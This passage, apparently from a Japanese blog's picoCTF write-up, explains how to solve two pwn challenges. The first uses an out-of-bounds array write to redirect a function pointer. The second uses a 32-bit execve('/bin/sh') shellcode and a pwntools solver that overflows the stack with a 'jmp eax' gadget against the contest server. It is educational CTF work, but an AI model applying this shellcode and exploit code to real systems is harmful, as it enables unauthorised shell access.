    &lt;span class=&quot;token function&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;buf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; FLAGSIZE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// size bound read&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;You&apos;re 13371337. Here&apos;s the flag.\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%s\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; buf&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;You&apos;ve failed this class.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;check&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; hard_checker&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; fun&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; story&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; num1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; num2&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Tell me a story and then I&apos;ll tell you if you&apos;re a 1337 &gt;&gt; &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%127s&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; story&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%d %d&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;num1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;num2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num1 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    fun&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;num1&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; num2&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;story&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;story&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; argc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;argv&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; _IONBF&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Set the gid to the effective gid&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// this prevents /bin/sh from dropping the privileges&lt;/span&gt;
  &lt;span class=&quot;token class-name&quot;&gt;gid_t&lt;/span&gt; gid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;gid&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; gid&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; gid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;普通に実行すると&lt;code class=&quot;language-text&quot;&gt;vuln&lt;/code&gt;が&lt;code class=&quot;language-text&quot;&gt;check&lt;/code&gt;という関数呼び出します。&lt;/p&gt;
&lt;p&gt;この&lt;code class=&quot;language-text&quot;&gt;check&lt;/code&gt;関数は、&lt;code class=&quot;language-text&quot;&gt;void (*check)(char*, size_t) = hard_checker;&lt;/code&gt;の通り&lt;code class=&quot;language-text&quot;&gt;hard_checker&lt;/code&gt;関数のポインタが格納されているようです。&lt;/p&gt;
&lt;p&gt;Flag取得までの大まかな流れとしては、この関数アドレスを&lt;code class=&quot;language-text&quot;&gt;easy_checker&lt;/code&gt;関数のアドレスに書き換えた上で&lt;code class=&quot;language-text&quot;&gt;calculate_story_score(story, len) == 1337&lt;/code&gt;を満たす入力値を特定する感じでした。&lt;/p&gt;
&lt;p&gt;ここで、関数アドレスの書き換えですが、直接的にアドレスを書き換えるのではなく、以下のコードを悪用して相対アドレスの書き換えを行いました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;num1 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    fun&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;num1&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; num2&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;具体的には、2回目の入力を&lt;code class=&quot;language-text&quot;&gt;-16 -314&lt;/code&gt;にすることで、配列&lt;code class=&quot;language-text&quot;&gt;fun&lt;/code&gt;の先頭アドレスから-16バイトしたアドレスの値を-314させることができます。&lt;/p&gt;
&lt;p&gt;これによって、元々&lt;code class=&quot;language-text&quot;&gt;hard_checker&lt;/code&gt;関数のアドレスが格納されていた変数&lt;code class=&quot;language-text&quot;&gt;check&lt;/code&gt;の値が、&lt;code class=&quot;language-text&quot;&gt;hard_checker&lt;/code&gt;関数のアドレス-314に上書きされ、&lt;code class=&quot;language-text&quot;&gt;easy_checker&lt;/code&gt;関数のアドレスを指すようになります。&lt;/p&gt;
&lt;p&gt;ここで、127文字以内の入力で以下の計算結果が1337になる値を求めた結果、1回目の入力は&lt;code class=&quot;language-text&quot;&gt;aaaaaaaaaaaaaL&lt;/code&gt;となり、Flagを取得することができました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;calculate_story_score&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;story&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; score &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    score &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; story&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; score&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;ropfupwn&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ropfupwn&quot; aria-label=&quot;ropfupwn permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ropfu(Pwn)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;description-4&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#description-4&quot; aria-label=&quot;description 4 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Description&lt;/h4&gt;
&lt;p&gt;What’s ROP?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ROPの入門的な問題でした。&lt;/p&gt;
&lt;p&gt;とりあえず&lt;code class=&quot;language-text&quot;&gt;objdump&lt;/code&gt;を叩いて見ると、スタック領域に実行権限が付与されていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ objdump -x vuln
vuln:     &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;format&lt;/span&gt; elf32-i386
vuln
architecture: i386, flags 0x00000112:
EXEC_P, HAS_SYMS, D_PAGED
start address 0x08049c20

Program Header:
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;**12
         filesz 0x000001e8 memsz 0x000001e8 flags r--
    LOAD off    0x00001000 vaddr 0x08049000 paddr 0x08049000 align &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;**12
         filesz 0x0006a960 memsz 0x0006a960 flags r-x
    LOAD off    0x0006c000 vaddr 0x080b4000 paddr 0x080b4000 align &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;**12
         filesz 0x0002e42d memsz 0x0002e42d flags r--
    LOAD off    0x0009a6a0 vaddr 0x080e36a0 paddr 0x080e36a0 align &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;**12
         filesz 0x00002c18 memsz 0x00003950 flags rw-
    NOTE off    0x00000134 vaddr 0x08048134 paddr 0x08048134 align &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;**2
         filesz 0x00000044 memsz 0x00000044 flags r--
     TLS off    0x0009a6a0 vaddr 0x080e36a0 paddr 0x080e36a0 align &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;**2
         filesz 0x00000010 memsz 0x00000030 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;**4
         filesz 0x00000000 memsz 0x00000000 flags rwx
   RELRO off    0x0009a6a0 vaddr 0x080e36a0 paddr 0x080e36a0 align &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;**0
         filesz 0x00001960 memsz 0x00001960 flags r--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;BOFを使って書き換えられるスタック領域のバイトサイズは28バイトでしたので、この範囲に収まるようにシェルを取得するシェルコードを作成します。&lt;/p&gt;
&lt;p&gt;シェルコードは以下のアセンブリで作成できました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; binsh2&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;s
BITS &lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;
global _start
 
_start&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    mov eax&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt;
    jmp buf
setebx&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    pop ebx
    xor ecx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ecx
    xor edx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; edx
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80&lt;/span&gt;
buf&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
    call setebx
    db &lt;span class=&quot;token char&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;x86CPUでexecveを呼び出しています。&lt;/p&gt;
&lt;p&gt;詳しくは以下。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://inaz2.hatenablog.com/entry/2014/03/13/013056&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Linux x86用のシェルコードを書いてみる - ももいろテクノロジー&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://book.mynavi.jp/manatee/detail/id=64562&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;シェルコードとは｜Tech Book Zone Manatee&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このシェルコードをスタックに埋め込んだ後、リターンアドレスに&lt;code class=&quot;language-text&quot;&gt;ret rsp&lt;/code&gt;のガジェットを入れてあげればOK、と思ったのですがそのようなガジェットが見つかりませんでした。&lt;/p&gt;
&lt;p&gt;そこで、&lt;code class=&quot;language-text&quot;&gt;jmp eax&lt;/code&gt;のガジェットを探してそのアドレスを入れてあげることでFlagが取得できました。&lt;/p&gt;
&lt;p&gt;最終的なSolverは以下です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; binascii
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; time

elf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ELF&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;./vuln&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;binary &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; elf

&lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;shellcode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;read&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
payload &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;b&quot;\x90&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
ret &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; p32&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0805334b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;# jmp eax&lt;/span&gt;
payload &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; ret

&lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;shellcode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;write&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# Local&lt;/span&gt;
p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; process&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;./vuln&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;# Remote&lt;/span&gt;
p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; remote&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;saturn.picoctf.net&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;59222&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; p&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;recvline&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
p&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sendline&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
